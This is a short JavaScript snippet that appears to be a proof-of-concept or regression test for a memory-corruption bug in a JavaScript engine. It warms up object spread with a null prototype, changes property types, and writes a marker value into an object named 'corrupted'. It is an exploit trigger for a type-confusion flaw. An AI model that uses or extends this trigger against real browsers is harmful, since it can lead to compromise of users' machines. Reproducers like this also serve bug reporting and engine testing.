let a = {p0: 1, p1: 1, p2: 1, p3: 1, p4: 1, p5: 1, p6: 1, p7: 1, p8: 1};
a.p9 = 1;
function throwaway() {
  return {...a, __proto__: null};
}
  for (let j = 0; j < 100; ++j)  
    throwaway();
  for (let key in a) a[key] = {};
function func() {
  return {...a, __proto__: null};
}
for (let j = 0; j < 100; ++j)  
corrupted = func();
corrupted.p9 = 0x42424242 >> 1;
